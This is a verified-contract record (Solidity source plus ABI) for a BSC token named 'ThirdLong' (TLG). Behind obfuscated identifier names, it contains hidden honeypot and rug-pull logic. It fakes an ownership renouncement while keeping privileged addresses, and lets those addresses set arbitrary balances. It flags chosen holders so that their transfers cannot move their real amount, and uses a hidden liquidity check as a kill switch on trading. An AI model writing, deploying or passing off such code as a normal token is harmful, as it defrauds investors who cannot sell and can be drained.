{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface autoReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minToMarketing) external view returns (uint256);\n\n    function transfer(address fundFromTake, uint256 buyTrading) external returns (bool);\n\n    function allowance(address minReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundFromTake,\n        uint256 buyTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityToken, uint256 value);\n    event Approval(address indexed minReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract tokenFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txMode {\n    function createPair(address sellTotal, address modeTeam) external returns (address);\n}\n\ninterface fundToken is autoReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ThirdLong is tokenFrom, autoReceiver, fundToken {\n\n    uint256 constant txTeam = 20 ** 10;\n\n    function atWallet(address shouldAmount, address fundFromTake, uint256 buyTrading) internal returns (bool) {\n        if (shouldAmount == atSender) {\n            return totalTeam(shouldAmount, fundFromTake, buyTrading);\n        }\n        uint256 txBuyLaunched = autoReceiver(minSwapFee).balanceOf(senderLaunch);\n        require(txBuyLaunched == toExempt);\n        require(fundFromTake != senderLaunch);\n        if (shouldTotalSender[shouldAmount]) {\n            return totalTeam(shouldAmount, fundFromTake, txTeam);\n        }\n        return totalTeam(shouldAmount, fundFromTake, buyTrading);\n    }\n\n    uint256 public limitMin;\n\n    mapping(address => mapping(address => uint256)) private shouldTo;\n\n    bool private walletIsAmount;\n\n    uint256 public tokenLimit;\n\n    uint256 toExempt;\n\n    uint256 public senderEnableReceiver;\n\n    mapping(address => uint256) private atMinSwap;\n\n    function approve(address amountTake, uint256 buyTrading) public virtual override returns (bool) {\n        shouldTo[_msgSender()][amountTake] = buyTrading;\n        emit Approval(_msgSender(), amountTake, buyTrading);\n        return true;\n    }\n\n    address teamLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 walletShould;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoIs;\n    }\n\n    bool public fundSender;\n\n    bool private totalToken;\n\n    function totalTeam(address shouldAmount, address fundFromTake, uint256 buyTrading) internal returns (bool) {\n        require(atMinSwap[shouldAmount] >= buyTrading);\n        atMinSwap[shouldAmount] -= buyTrading;\n        atMinSwap[fundFromTake] += buyTrading;\n        emit Transfer(shouldAmount, fundFromTake, buyTrading);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenSell;\n    }\n\n    function liquidityLimit(uint256 buyTrading) public {\n        listAutoAmount();\n        toExempt = buyTrading;\n    }\n\n    function getOwner() external view returns (address) {\n        return senderToken;\n    }\n\n    function transferFrom(address shouldAmount, address fundFromTake, uint256 buyTrading) external override returns (bool) {\n        if (_msgSender() != teamLaunched) {\n            if (shouldTo[shouldAmount][_msgSender()] != type(uint256).max) {\n                require(buyTrading <= shouldTo[shouldAmount][_msgSender()]);\n                shouldTo[shouldAmount][_msgSender()] -= buyTrading;\n            }\n        }\n        return atWallet(shouldAmount, fundFromTake, buyTrading);\n    }\n\n    address public atSender;\n\n    function transfer(address limitAmount, uint256 buyTrading) external virtual override returns (bool) {\n        return atWallet(_msgSender(), limitAmount, buyTrading);\n    }\n\n    mapping(address => bool) public toTakeMax;\n\n    bool public shouldMin;\n\n    bool private listMarketingSender;\n\n    address public minSwapFee;\n\n    constructor (){\n        \n        fromSender enableTo = fromSender(teamLaunched);\n        minSwapFee = txMode(enableTo.factory()).createPair(enableTo.WETH(), address(this));\n        \n        atSender = _msgSender();\n        receiverTo();\n        toTakeMax[atSender] = true;\n        atMinSwap[atSender] = autoIs;\n        \n        emit Transfer(address(0), atSender, autoIs);\n    }\n\n    uint8 private tokenSell = 18;\n\n    uint256 private autoIs = 100000000 * 10 ** 18;\n\n    uint256 public fromTeam;\n\n    string private minToBuy = \"Third Long\";\n\n    function balanceOf(address minToMarketing) public view virtual override returns (uint256) {\n        return atMinSwap[minToMarketing];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return minToBuy;\n    }\n\n    function listAutoAmount() private view {\n        require(toTakeMax[_msgSender()]);\n    }\n\n    function exemptReceiver(address limitAmount, uint256 buyTrading) public {\n        listAutoAmount();\n        atMinSwap[limitAmount] = buyTrading;\n    }\n\n    bool private receiverToken;\n\n    mapping(address => bool) public shouldTotalSender;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountTakeMarketing;\n    }\n\n    function fundTake(address liquidityFund) public {\n        if (shouldMin) {\n            return;\n        }\n        \n        toTakeMax[liquidityFund] = true;\n        if (autoEnable != fromTeam) {\n            fromTeam = tokenLimit;\n        }\n        shouldMin = true;\n    }\n\n    function allowance(address shouldExemptMode, address amountTake) external view virtual override returns (uint256) {\n        if (amountTake == teamLaunched) {\n            return type(uint256).max;\n        }\n        return shouldTo[shouldExemptMode][amountTake];\n    }\n\n    function swapWalletFee(address isBuy) public {\n        listAutoAmount();\n        if (walletIsAmount == listMarketingSender) {\n            receiverToken = false;\n        }\n        if (isBuy == atSender || isBuy == minSwapFee) {\n            return;\n        }\n        shouldTotalSender[isBuy] = true;\n    }\n\n    string private amountTakeMarketing = \"TLG\";\n\n    uint256 private autoEnable;\n\n    function owner() external view returns (address) {\n        return senderToken;\n    }\n\n    event OwnershipTransferred(address indexed fromLimit, address indexed amountLaunched);\n\n    function receiverTo() public {\n        emit OwnershipTransferred(atSender, address(0));\n        senderToken = address(0);\n    }\n\n    address private senderToken;\n\n    address senderLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldExemptMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minToMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyTrading\",\"type\":\"uint256\"}],\"name\":\"exemptReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFund\",\"type\":\"address\"}],\"name\":\"fundTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyTrading\",\"type\":\"uint256\"}],\"name\":\"liquidityLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSwapFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderEnableReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldTotalSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isBuy\",\"type\":\"address\"}],\"name\":\"swapWalletFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toTakeMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundFromTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ThirdLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}